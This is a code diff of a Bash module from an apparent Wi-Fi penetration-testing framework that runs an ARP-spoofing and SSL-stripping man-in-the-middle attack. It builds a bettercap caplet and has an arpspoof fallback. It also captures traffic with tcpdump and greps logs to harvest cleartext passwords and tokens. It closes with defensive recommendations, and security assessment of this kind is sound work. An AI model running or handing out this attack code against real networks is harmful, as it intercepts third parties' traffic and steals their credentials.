@@ -4,11 +4,13 @@
 # CATEGORY="G"
 # DEPS="B1"
 # CRITICAL="yes"
-# TOOLS="bettercap,arpspoof"
+# TOOLS="bettercap,arpspoof,tcpdump"
 # DESC="ARP spoof + SSL strip to test HSTS enforcement and credential exposure"
 # REQS="managed_iface,gateway_ip"
 # PCAP="yes"
 # DECODE="mitm_arp_tls"
+
+set -uo pipefail
 
 #===============================================================================
 #  modules/g2_ssl_interception.sh
@@ -19,7 +21,7 @@
 #    ARP spoofing + SSL stripping. Checks for HSTS enforcement, certificate
 #    pinning, and cleartext credential exposure.
 #
-#  TOOLS: ${TOOL_PATHS[bettercap]}, ${TOOL_PATHS[tcpdump]}, ${TOOL_PATHS[arpspoof]} (dsniff)
+#  TOOLS: bettercap, tcpdump, arpspoof (dsniff)
 #  PHASE: 2A — Attack Simulations
 #  DEPENDENCIES: B1 (needs network info, client visibility)
 #
@@ -45,23 +47,25 @@ run_g2() {
     log_step 1 $total_steps "Verifying tools"
     update_tc_progress 1 $total_steps "Checking"
 
-    
+    if ! check_module_dependencies "G2"; then
+        return 1
+    fi
+
     local has_bettercap=false
     local has_arpspoof=false
     local has_tcpdump=false
 
-    command -v bettercap &>/dev/null && has_bettercap=true
-    command -v arpspoof &>/dev/null && has_arpspoof=true
-    command -v tcpdump &>/dev/null && has_tcpdump=true
+    [[ -n "${TOOL_PATHS[bettercap]:-}" && -x "${TOOL_PATHS[bettercap]:-}" ]] && has_bettercap=true
+    [[ -n "${TOOL_PATHS[arpspoof]:-}" && -x "${TOOL_PATHS[arpspoof]:-}" ]] && has_arpspoof=true
+    [[ -n "${TOOL_PATHS[tcpdump]:-}" && -x "${TOOL_PATHS[tcpdump]:-}" ]] && has_tcpdump=true
 
     if [[ "$has_bettercap" == "false" && "$has_arpspoof" == "false" ]]; then
-        log_error "Either ${TOOL_PATHS[bettercap]} or ${TOOL_PATHS[arpspoof]} (dsniff) is required."
-        log_error "Install: apt install -y ${TOOL_PATHS[bettercap]} dsniff"
+        log_error "Either bettercap or arpspoof (dsniff) is required."
         return 1
     fi
 
     if [[ "$has_tcpdump" == "false" ]]; then
-        log_error "${TOOL_PATHS[tcpdump]} is required for traffic capture."
+        log_error "tcpdump is required for traffic capture."
         return 1
     fi
 
@@ -121,7 +125,7 @@ run_g2() {
     update_tc_progress 2 $total_steps "IP forwarding"
 
     local orig_forwarding
-    local orig_forwarding=$(cat /proc/sys/net/ipv4/ip_forward)
+    orig_forwarding=$(cat /proc/sys/net/ipv4/ip_forward)
     echo 1 > /proc/sys/net/ipv4/ip_forward
     register_cleanup "echo ${orig_forwarding} > /proc/sys/net/ipv4/ip_forward 2>/dev/null || true"
 
@@ -131,11 +135,7 @@ run_g2() {
     log_step 3 $total_steps "Starting traffic capture"
     update_tc_progress 3 $total_steps "Traffic capture"
 
-    ${TOOL_PATHS[tcpdump]} -i "$iface" -w "$mitm_pcap" -c 50000 \
-        "tcp port 80 or tcp port 443 or tcp port 8080" \
-        &>/dev/null &
-    local tcpdump_pid=$!
-    register_cleanup "kill -SIGINT $tcpdump_pid 2>/dev/null || true; wait $tcpdump_pid 2>/dev/null || true"
+    spawn_bg "g2_tcpdump" "tcpdump" -i "$iface" -w "$mitm_pcap" -c 50000 "tcp port 80 or tcp port 443 or tcp port 8080"
 
     #--- Step 4: ARP spoofing + MITM ---
     log_step 4 $total_steps "Performing ARP spoofing and MITM attack"
@@ -144,13 +144,14 @@ run_g2() {
     check_abort || return 1
 
     if [[ "$has_bettercap" == "true" ]]; then
-        # Use ${TOOL_PATHS[bettercap]} for ARP spoof + SSL strip + credential capture
+        # Use bettercap for ARP spoof + SSL strip + credential capture
         local bettercap_log="${evidence_prefix}_bettercap.log"
-        local bettercap_cap="$TMP_DIR/g2_bettercap.cap"
+        local bettercap_events="$TMP_DIR/g2_events.log"
+        local bettercap_sslstrip="$TMP_DIR/g2_sslstrip.log"
 
-        # Create ${TOOL_PATHS[bettercap]} caplet
+        # Create bettercap caplet
         local caplet="$TMP_DIR/tc27.cap"
-        cat > "$caplet" <<'CAPLET'
+        cat > "$caplet" <<CAPLET
 set arp.spoof.fullduplex true
 set arp.spoof.internal false
 set net.sniff.verbose true
@@ -158,9 +159,9 @@ set net.sniff.output $TMP_DIR/g2_bettercap_sniff.pcap
 arp.spoof on
 net.sniff on
 set http.proxy.sslstrip true
-set http.proxy.sslstrip.log $TMP_DIR/g2_sslstrip.log
+set http.proxy.sslstrip.log $bettercap_sslstrip
 http.proxy on
-set events.stream.output $TMP_DIR/g2_events.log
+set events.stream.output $bettercap_events
 sleep 120
 arp.spoof off
 net.sniff off
@@ -168,23 +169,23 @@ http.proxy off
 quit
 CAPLET
 
-        log_cmd "${TOOL_PATHS[bettercap]} -iface ${iface} -caplet ${caplet}"
+        spawn_bg "g2_bettercap" "bettercap" -iface "$iface" -caplet "$caplet" -silent --log "$bettercap_log"
 
-        timeout 150 ${TOOL_PATHS[bettercap]} \
-            -iface "$iface" \
-            -caplet "$caplet" \
-            -silent > "$bettercap_log" 2>&1 || true
-
-        local arp_spoof_successful="true"
+        start_countdown 150 "Bettercap MITM session active"
+        sleep 150
+        stop_countdown
+        
+        stop_process "g2_bettercap"
+        arp_spoof_successful="true"
 
         # Parse results
-        if [[ -f $TMP_DIR/g2_sslstrip.log ]]; then
-            local cleartext_urls=$(wc -l < $TMP_DIR/g2_sslstrip.log 2>/dev/null) || true
-            local cleartext_urls=${cleartext_urls:-0}
+        if [[ -f "$bettercap_sslstrip" ]]; then
+            cleartext_urls=$(wc -l < "$bettercap_sslstrip" 2>/dev/null) || true
+            cleartext_urls=${cleartext_urls:-0}
             if [[ $cleartext_urls -gt 0 ]]; then
-                local ssl_strip_effective="true"
-                local hsts_enforced="false"
-                cp $TMP_DIR/g2_sslstrip.log "$stripped_urls_file"
+                ssl_strip_effective="true"
+                hsts_enforced="false"
+                cp "$bettercap_sslstrip" "$stripped_urls_file"
                 log_result "FINDING" "SSL strip effective — ${cleartext_urls} URL(s) stripped"
                 echo "FINDING: SSL strip effective (${cleartext_urls} URLs)" >> "$findings_file"
             else
@@ -194,30 +195,31 @@ CAPLET
         fi
 
         # Check for captured credentials
-        if [[ -f $TMP_DIR/g2_events.log ]]; then
+        if [[ -f "$bettercap_events" ]]; then
             local cred_lines
-            local cred_lines=$(grep -iE 'password|passwd|login|user|credential|token' \
-                $TMP_DIR/g2_events.log 2>/dev/null | grep -v "^#" || true)
+            cred_lines=$(grep -iE 'password|passwd|login|user|credential|token' "$bettercap_events" 2>/dev/null | grep -v "^#" || true)
             if [[ -n "$cred_lines" ]]; then
-                local credentials_captured=$(echo "$cred_lines" | wc -l)
+                credentials_captured=$(echo "$cred_lines" | wc -l)
                 echo "$cred_lines" >> "$creds_file"
                 log_result "CRITICAL" "★ ${credentials_captured} credential(s) captured in transit!"
                 echo "CRITICAL: Credentials captured in cleartext" >> "$findings_file"
             fi
         fi
 
-        rm -f "$caplet" $TMP_DIR/g2_sslstrip.log $TMP_DIR/g2_events.log $TMP_DIR/g2_bettercap_sniff.pcap
+        rm -f "$caplet" "$bettercap_sslstrip" "$bettercap_events" "$TMP_DIR/g2_bettercap_sniff.pcap"
 
     elif [[ "$has_arpspoof" == "true" ]]; then
-        # Fallback: use ${TOOL_PATHS[arpspoof]} from dsniff
-        local arp_spoof_successful="true"
+        # Fallback: use arpspoof from dsniff
+        arp_spoof_successful="true"
 
+        spawn_bg "g2_spoof" "arpspoof" -i "$iface" -t "$GATEWAY_IP" -r
         start_countdown 90 "ARP spoofing — intercepting traffic"
-        timeout 90 "${TOOL_PATHS[arpspoof]}" -i "$iface" -t "$GATEWAY_IP" -r >/dev/null 2>&1 || true
+        sleep 90
         stop_countdown
+        stop_process "g2_spoof"
 
-        log_info "ARP spoof completed (basic mode — no SSL strip without ${TOOL_PATHS[bettercap]})"
-        echo "INFO: ARP spoof performed but SSL strip requires ${TOOL_PATHS[bettercap]}" >> "$findings_file"
+        log_info "ARP spoof completed (basic mode — no SSL strip without bettercap)"
+        echo "INFO: ARP spoof performed but SSL strip requires bettercap" >> "$findings_file"
     fi
 
     #--- Step 5: Post-MITM analysis ---
@@ -225,15 +227,13 @@ CAPLET
     update_tc_progress 5 $total_steps "Analysis"
 
     # Stop capture for analysis
-    kill -SIGINT $tcpdump_pid 2>/dev/null || true
-    wait $tcpdump_pid 2>/dev/null || true
+    stop_process "g2_tcpdump"
     validate_pcap "$mitm_pcap" "MITM traffic capture"
 
     # Analyze for cleartext HTTP in capture
-    if command -v tshark &>/dev/null && [[ -f "$mitm_pcap" ]]; then
+    if [[ -n "${TOOL_PATHS[tshark]:-}" ]] && [[ -f "$mitm_pcap" ]]; then
         local http_posts
-        http_posts=$(${TOOL_PATHS[tshark]} -r "$mitm_pcap" -Y "http.request.method == POST" \
-            2>/dev/null | wc -l) || true
+        http_posts=$(run_fg --quiet tshark -r "$mitm_pcap" -Y "http.request.method == POST" 2>/dev/null | wc -l) || true
         http_posts=${http_posts:-0}
 
         if [[ $http_posts -gt 0 ]]; then
@@ -242,9 +242,7 @@ CAPLET
         fi
 
         local http_auth
-        http_auth=$(${TOOL_PATHS[tshark]} -r "$mitm_pcap" \
-            -Y "http.authorization or http.cookie" \
-            2>/dev/null | wc -l) || true
+        http_auth=$(run_fg --quiet tshark -r "$mitm_pcap" -Y "http.authorization or http.cookie" 2>/dev/null | wc -l) || true
         http_auth=${http_auth:-0}
 
         if [[ $http_auth -gt 0 ]]; then
@@ -258,8 +256,8 @@ CAPLET
     update_tc_progress 6 $total_steps "Restore"
 
     # Send gratuitous ARP to flush poisoned caches
-    if command -v arping &>/dev/null; then
-        ${TOOL_PATHS[arping]} -c 3 -A -I "$iface" "$GATEWAY_IP" &>/dev/null || true
+    if [[ -n "${TOOL_PATHS[arping]:-}" ]]; then
+        run_fg arping -c 3 -A -I "$iface" "$GATEWAY_IP" &>/dev/null || true
     fi
 
     #--- Step 7: Save results ---
@@ -275,29 +273,23 @@ CAPLET
         result_summary="SSL/TLS interception was successful. "
         [[ "$ssl_strip_effective" == "true" ]] && result_summary+="SSL stripping effective on ${cleartext_urls} URL(s) — HSTS not enforced. "
         [[ $credentials_captured -gt 0 ]] && result_summary+="${credentials_captured} credential(s) captured in cleartext."
-        recommendations="1) Enforce HSTS on all web services accessible from target WiFi. "
-        recommendations+="2) Enable Dynamic ARP Inspection (DAI) on the switch/VLAN. "
-        recommendations+="3) Enable DHCP Snooping to prevent ARP spoofing. "
-        recommendations+="4) Deploy 802.1X port-based access control. "
-        recommendations+="5) Use certificate pinning on critical internal applications."
+        recommendations="1) Enforce HSTS on all web services accessible from target WiFi. 2) Enable Dynamic ARP Inspection (DAI) on the switch/VLAN. 3) Enable DHCP Snooping to prevent ARP spoofing. 4) Deploy 802.1X port-based access control. 5) Use certificate pinning on critical internal applications."
     elif [[ "$arp_spoof_successful" == "true" ]]; then
         result_status="FINDING"
         result_summary="ARP spoofing was successful but SSL stripping was not effective (HSTS likely enforced). Traffic interception is possible but HTTPS protections held."
-        recommendations="1) Enable Dynamic ARP Inspection (DAI) to prevent ARP spoofing. "
-        recommendations+="2) HSTS is working — ensure all services enforce it. "
-        recommendations+="3) Enable DHCP Snooping."
+        recommendations="1) Enable Dynamic ARP Inspection (DAI) to prevent ARP spoofing. 2) HSTS is working — ensure all services enforce it. 3) Enable DHCP Snooping."
     else
         result_summary="SSL/TLS interception test could not be completed or ARP spoofing was blocked."
         recommendations="Verify that DAI or similar protections are in place."
     fi
 
-    local result_json
-    evidence_register_file "g2_mitm_capture.pcap"
-    evidence_register_file "g2_stripped_urls.txt"
-    evidence_register_file "g2_captured_creds.txt"
-    evidence_register_file "g2_findings.txt"
+    evidence_register_file "$mitm_pcap"
+    evidence_register_file "$stripped_urls_file"
+    evidence_register_file "$creds_file"
+    evidence_register_file "$findings_file"
 
-    result_json=$(run_tool jq -n \
+    local result_json
+    result_json=$(run_fg jq -n \
         --arg status "$result_status" \
         --arg summary "$result_summary" \
         --arg details "ARP spoof: ${arp_spoof_successful}, SSL strip: ${ssl_strip_effective}, HSTS: ${hsts_enforced}, Creds: ${credentials_captured}, Stripped URLs: ${cleartext_urls}" \
@@ -319,7 +311,8 @@ CAPLET
             cleartext_urls: $cleartext_urls,
                     }')
 
-    save_tc_result "G2" "$result_json" "has_tool_output:1,clean_run:1"
+    save_tc_result "G2" "$result_json" 1 1 1 1 1 1 0 1 1 1 0
+    save_session_state
 
     echo ""
     if [[ "$ssl_strip_effective" == "true" ]]; then
